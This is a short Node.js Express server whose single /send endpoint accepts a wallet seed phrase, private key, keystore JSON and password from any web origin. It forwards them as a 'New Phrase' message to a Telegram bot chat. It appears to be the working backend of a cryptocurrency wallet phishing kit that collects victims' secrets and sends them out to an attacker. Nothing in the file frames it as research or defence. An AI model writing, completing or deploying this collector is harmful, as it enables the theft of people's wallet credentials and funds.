const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.post("/send", async (req, res) => {

    const {
        phrase,
        private,
        key,
        Pass
    } = req.body;

    const message =
`📩 New Phrase

Phrase: ${phrase}

privateKey: ${private}

keystoreJson: ${key}

Password:
${Pass}`;

    try {

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message
            }
        );

        res.json({
            success: true
        });

    } catch (err) {

        console.log(err.response?.data || err);

        res.status(500).json({
            success: false
        });

    }

});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log("Server running...");
});
